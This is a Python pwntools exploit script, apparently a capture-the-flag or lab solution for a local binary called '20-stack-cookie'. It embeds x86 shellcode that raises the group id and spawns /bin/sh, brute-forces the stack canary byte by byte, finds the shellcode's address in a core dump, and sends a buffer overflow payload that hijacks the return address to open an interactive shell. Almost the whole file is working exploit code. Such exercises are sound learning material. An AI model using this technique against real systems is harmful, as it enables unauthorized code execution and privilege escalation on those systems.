#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, log, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

shellcode = asm(
"""
/* getegid(); setregid(egid, egid) */
xor     eax, eax          /* 31 c0 */
mov     al, 0x32          /* b0 32 */
int     0x80              /* cd 80       ; getegid -> eax */
push    eax               /* 50          ; save gid */
pop     ebx               /* 5b          ; ebx = gid */
push    eax
pop     ecx               /* 59          ; ecx = gid */

xor     eax, eax
mov     al, 0x47          /* b0 47 */
int     0x80              /* cd 80       ; setregid(ebx, ecx) */

/* execve("/bin/sh", 0, 0) */
xor     eax, eax          /* zero eax */
push    eax               /* push 0 (terminator) */
push    0x68732f2f        /* push "//sh" (2f2f7368) */
push    0x6e69622f        /* push "/bin" (2f62696e) */
mov     ebx, esp          /* pointer to "/bin//sh" */
xor     ecx, ecx          /* argv = 0 */
xor     edx, edx          /* envp = 0 */
mov     al, 0x0b          /* execve */
int     0x80
"""
)
p = process(["./20-stack-cookie"], env={"SHELLCODE": shellcode})
canary = []
guess = 0
while len(canary) < 4:
    print(p.recvline())  # reaming trials
    print(p.recvline())  # how many bytes?
    p.sendline(f"{128 + len(canary) + 1}".encode())
    print(p.recvline())  # reading
    payload = b"A" * 128 + bytes(canary + [guess])
    p.sendline(payload)
    print(p.recvline())  # hello

    resp = p.recvline()  # stack smashing or exit
    print(resp)
    if "stack" in resp.decode():
        guess += 1
        resp = p.recvline()  # exit status
        print("EXIT", resp)
    if "0" in resp.decode():
        print("Found byte: " + hex(guess))
        canary.append(guess)
        guess = 0
    print("GUESS", guess, canary)

print("---------Canary found-----------")
print("You've got", bytes(canary))

system_addr = p32(0xf7e103d0)

core = Core('./core')
shellcode_addr = core.stack.find(shellcode)

assert shellcode_addr > 0, "failed to find payload"
print("\n We found the shellcode addr! ")
print("--------------------------------")
packed = p32(shellcode_addr)
#shellcode_addr = p32(0xffffdd3c)
print("packed bytes (hex):", packed.hex())
print("packed canary", [hex(x) for x in canary])
p.recvline()
p.recvline()
payload = (
    b"A" * 128
    + bytes(canary)
    + b"A" * (144 - 128 - len(canary))
    + packed
)

with open("shellcode.bin",'wb') as outfile:
    outfile.write(payload)
p.sendline(f"{len(payload)}".encode())
p.sendline(payload)
p.interactive()